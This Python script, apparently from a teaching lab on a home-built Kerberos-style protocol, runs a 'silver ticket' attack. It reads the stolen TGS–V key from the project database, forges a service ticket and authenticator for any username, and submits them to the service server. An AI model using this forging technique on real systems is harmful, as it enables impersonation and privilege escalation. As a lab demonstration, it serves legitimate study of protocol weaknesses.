from database import db,keys_collection

import sys
import socket
import time
import pysodium
from security import symmetric_encrypt,symmetric_decrypt
import hashlib
import struct
from database import db, users_collection,keys_collection
from fontTools.misc.filenames import userNameToFileName
from security import symmetric_decrypt, symmetric_encrypt

# 规定标准的长度
MAX_ID_BYTES = 64
KEY_LEN = 32
TS_LEN = 8
NONCE_LEN = 24
MAC_LEN=16

def create_server(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.bind(('0.0.0.0', port))
    sock.listen(1)
    return sock


def connect_socket(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    try:
        sock.connect((ip, port))
    except Exception as e:
        print(f"连接失败: {e}")
        exit(1)
    return sock

#敌手拿到了TGS和V共享的密钥之后，就可以在不需要任意用户除用户名外的信息情况下，跳过AS服务器和TGS服务器伪造票据，获得任意大的权限
def silver_ticket():
    if len(sys.argv) != 4:
        print("用法: python脚本名 <username> <V_IP> <V_PORT>")
        exit(1)


    #敌手选定想要伪造的用户的白银票据
    id_c = sys.argv[1]
    id_c_encoded=id_c.encode()[:MAX_ID_BYTES].ljust(MAX_ID_BYTES,b'\0')
    id_v='V'
    id_v_encoded=id_v.encode()[:MAX_ID_BYTES].ljust(MAX_ID_BYTES,b'\0')

    K_c_v=pysodium.randombytes(pysodium.crypto_secretbox_KEYBYTES)
    ts_4=time.time()
    ts_4_encoded=struct.pack(">d",ts_4)
    key=keys_collection.find_one({"key_name":"tgs_v"})
    if not key:
        print("查找密钥不存在")
        exit(1)

    k_v=key.get("key")
    ls_4=3600
    ls_4_encoded=struct.pack(">d",ls_4)

    ticket=K_c_v+id_c_encoded+id_v_encoded+ts_4_encoded+ls_4_encoded
    nonce_v,ticket_v=symmetric_encrypt(ticket,k_v)
    Ticket_v=ticket_v+nonce_v

    ip_v=sys.argv[2]
    port_v=int(sys.argv[3])
    sock_v = connect_socket(ip_v, port_v)

    ts_5 = time.time()
    ts_5_encoded = struct.pack('>d', ts_5)

    # 构造最终认证器
    auth_data_v = id_c_encoded + ts_5_encoded
    nonce_v, auth_encrypted_v = symmetric_encrypt(auth_data_v, K_c_v)
    Authenticator_2 = auth_encrypted_v + nonce_v

    sock_v.sendall(Ticket_v + Authenticator_2)

    data = b''
    while len(data) < TS_LEN:
        data += sock_v.recv(4096)

    try:
        ts_response = struct.unpack('>d', data)[0]
        if abs(ts_response - (ts_5 + 1)) > 1:
            print("票据服务器认证失败")
            exit(1)
    except struct.error:
        print("无效的时间戳响应")
        exit(1)

    print("白银票据认证成功")

if __name__ == "__main__":
    silver_ticket()
